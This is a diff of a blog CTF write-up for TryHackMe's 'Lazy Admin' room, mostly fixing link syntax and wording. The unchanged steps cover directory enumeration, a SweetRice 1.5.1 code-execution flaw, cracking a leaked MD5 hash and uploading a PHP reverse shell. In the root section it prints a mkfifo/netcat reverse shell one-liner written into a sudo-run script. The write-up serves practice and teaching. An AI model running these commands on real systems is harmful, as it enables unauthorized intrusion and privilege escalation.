@@ -7,7 +7,7 @@ category : CTF-WriteUp
 ---
 
 ### <mark style='background-color: white'>Introduction</mark>
-'Lazy Admin' is an easy room made by [https://tryhackme.com/p/MrSeth6797](MrSeth6797), great for practice challenges. 
+'Lazy Admin' is an easy room made by [MrSeth6797](https://tryhackme.com/p/MrSeth6797), great for practice challenges. 
 Let's get started! 
 
 ### <mark style='background-color: white'>Enumeration</mark>
@@ -30,13 +30,13 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: Apache2 Ubuntu Default Page: It works
 </pre>
 - - - 
-Examining the source code in web service running for some creds, found nothing. So I fire up gobuster using the *directory-list-2.3-medium.txt* wordlist and found a subdirectory called */content* : 
+Examining the source code of the running web service looking for some creds, found nothing. So I fire up gobuster using the *directory-list-2.3-medium.txt* wordlist and found a subdirectory called */content* : 
 ![/content](/assets/images/writeups/thm/lazy_admin/content.png "/content")
 Found out that "Basic-CMS Sweetrice" is running here, firing up gobuster again and adding */content* to the URI and here's the result: 
 ![/gobustercontent](/assets/images/writeups/thm/lazy_admin/gobuster_content.png "/gobuster_content")
-Did some research about this CMS and found that it the version 1.5.1 suffers from a code execution vulnerability via the use of a cross site request forgery flaw.
-Check this link : [https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html](SweetRice-1.5.1-Code-Execution)
-So basically, this means that I can upload a php reverse shell and execute it but first we need credentials to login and then upload our file, so we need more enumeration.
+Did some research about this CMS and found that the 1.5.1 version suffers from a code execution vulnerability via the use of a cross site request forgery flaw.
+Check this link : [SweetRice-1.5.1-Code-Execution](https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html)
+So basically, this means that I can upload a php reverse shell and execute it but first we need some credentials to login and then upload our file, so we need more enumeration.
 I examine the other subdirectories and there's a specific file that got my attention : */content/inc/mysql\_backup/mysql\_backup/mysql\_bakup\_20191129023059-1.5.1.sql* ! 
 Examining it carefully, I found a username and a password hash (*line 79*).
 The password hash type is MD5, I used hydra to crack it using the *rockyou.txt* wordlist and then logged in the *Sweetrice* CMS, easy hein ? 
@@ -70,7 +70,7 @@ THM{#####################}
 - - -
 
 
-### <mark style='background-color:white'>root.txt</mark>
+### <mark style='background-color:white'>ROOT.txt</mark>
 Now we need to find a way to get the root flag !
 First of all, I ran *sudo -l* command : 
 - - -
@@ -105,7 +105,7 @@ $ ls -al /etc/copy.sh
 and yeah we can edit it, SUPER ! So the first idea tha came in my mind is to get an another reverse shell using this command : 
 - - - 
 <pre> 
-$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' >/etc/copy.sh
+$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 \>/tmp/f' \>/etc/copy.sh
 </pre>
 - - - 
 After setting up the listener and ran the command, I got the root shell ! now it's time the get root flag !! :) finally ! 
